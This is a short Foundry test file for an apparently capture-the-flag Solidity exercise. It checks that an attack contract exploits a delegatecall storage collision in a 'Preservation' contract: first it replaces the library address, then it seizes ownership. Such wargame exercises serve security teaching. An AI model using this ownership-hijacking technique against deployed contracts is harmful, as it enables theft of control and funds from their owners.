// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/Preservation.sol";
import "src/PreservationAttack.sol";    

address constant DEPLOYER = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38;

contract PreservationAttackTest is Test {
    Preservation private preservation;
    PreservationAttack private preservationAttack;

    function setUp() public {
        preservation = new Preservation(address(new LibraryContract()), address(new LibraryContract()));
        preservationAttack = new PreservationAttack(address(preservation));
    }

    function testAttack() public {
        preservationAttack.takeSlotZero();
        assertEq(address(preservation.timeZone1Library()), address(preservationAttack));

        // console.log("casted address -> uint256", uint256(uint160(DEPLOYER)));
        preservation.setFirstTime(uint256(uint160(DEPLOYER)));
        assertEq(preservation.owner(), DEPLOYER);
    }
}